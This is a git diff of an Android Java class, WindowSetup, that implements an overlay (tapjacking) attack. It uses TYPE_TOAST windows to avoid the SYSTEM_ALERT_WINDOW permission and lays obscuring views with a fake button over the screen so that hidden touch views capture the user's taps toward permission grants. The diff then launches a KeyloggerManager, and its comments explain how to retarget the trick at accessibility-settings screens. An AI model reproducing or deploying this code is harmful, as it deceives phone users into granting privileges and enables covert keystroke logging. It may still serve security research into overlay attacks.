@@ -19,9 +19,6 @@ import android.view.WindowManager;
 
 public class WindowSetup {
 
-    /**The view found by the passed in context is treated as a type TOAST to create an overlay and
-     * avoid the SYSTEM_ALERT_WINDOW permission.
-     */
     private int type =  WindowManager.LayoutParams.TYPE_TOAST;
     private int flags = 0;
     private static WindowManager manager;
@@ -35,6 +32,7 @@ public class WindowSetup {
      * @param context
      */
     public WindowSetup(Context context) {
+
         manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         Display display = manager.getDefaultDisplay();
         Point size = new Point();
@@ -42,23 +40,30 @@ public class WindowSetup {
         width = size.x;
         height = size.y;
 
-        KeyloggerManager keyloggerManager = new KeyloggerManager(context, manager, width, height);
+        //KeyloggerManager keyloggerManager = new KeyloggerManager(context, manager, width);
     }
 
+    /** If bypassSetup is called then the SYSTEM_ALERT permission should already be granted. This funtion
+     *  should be able to safely call the keyloggerManager now.
+     */
+    public void bypassSetup(Context context) {
+        KeyloggerManager keyloggerManager = new KeyloggerManager(context, manager, width);
+    }
 
     /**
-     * startToast begins the first phase of acquiring the BIND_ACCESSIBILITY permission. An overlaying view, which
+     * startToast begins the first phase of acquiring the SYSTEM_ALERT_WINDOW permission. An overlaying view, which
      * is only used to display a fake button, and a touch view, used to detect if the overlay view has been touched,
-     * are created.
-     * @param context
+     * are created. To use this app for get the ACCESSIBILITY_SERVICES permission, enable the startPhase3 call in startPhase2
+     * and adjust the layoutParams for the accessibility settings windows.
+     *
      */
-    public void startToast(final Context context) {
+    public void startToast(Context context) {
 
         final Context parent = context;
 
         manager = (WindowManager) parent.getSystemService(Context.WINDOW_SERVICE);
 
-        padding = View.inflate(context, R.layout.padding_view, null);
+        padding = View.inflate(parent, R.layout.padding_view, null);
         WindowManager.LayoutParams layoutParams_pad = new WindowManager.LayoutParams(width, height, type, flags
                 | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                 | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
@@ -67,7 +72,7 @@ public class WindowSetup {
         manager.addView(padding, layoutParams_pad);
 
 
-        overlaying_view1 = View.inflate(context, R.layout.activity_obscuring_toast, null);
+        overlaying_view1 = View.inflate(parent, R.layout.activity_obscuring_toast, null);
         WindowManager.LayoutParams layoutParams_obs1 = new WindowManager.LayoutParams(width, 340, type, flags
                 | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                 | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
@@ -76,7 +81,7 @@ public class WindowSetup {
         manager.addView(overlaying_view1, layoutParams_obs1);
 
         //The touch view is responsible for listening for a touch which calls phase2 when true
-        touch_view = View.inflate(context, R.layout.touch_view, null);
+        touch_view = View.inflate(parent, R.layout.touch_view, null);
         WindowManager.LayoutParams layoutParams_touch1 = new WindowManager.LayoutParams(width, height - height/3 + 195, type, flags
                 | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                 | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
@@ -86,7 +91,6 @@ public class WindowSetup {
             @Override
             public boolean onTouch(View v, MotionEvent event) {
                 if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
-                    System.out.println("!!!!!!!!!!!!!!!!!!!!!!Touch Detected!!!!!!!!!!!!!!!!!!");
                     startPhase2(parent);
                     return true;
                 }
@@ -128,8 +132,10 @@ public class WindowSetup {
             @Override
             public boolean onTouch(View v, MotionEvent event) {
                 if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
-                    System.out.println("!!!!!!!!!!!!!!!!!!!!!!Touch Detected!!!!!!!!!!!!!!!!!!");
-                    /**startPhase3(parent);*/
+                    /** If this app is being used to gain accessibility privileges, uncomment the startPhase3 call
+                     *  and comment out the rest of the code below. The width and height parameters for all of the layoutParams
+                     *  will need to be adjusted for the accessibility settings window.
+                     * startPhase3(parent);*/
                     overlaying_view1.setVisibility(View.GONE);
                     touch_view.setVisibility(View.GONE);
 
@@ -137,6 +143,8 @@ public class WindowSetup {
                     startMain.addCategory(Intent.CATEGORY_HOME);
                     startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     parent.startActivity(startMain);
+
+                    KeyloggerManager keyloggerManager = new KeyloggerManager(parent, manager, width);
                     return true;
                 }
                 return false;
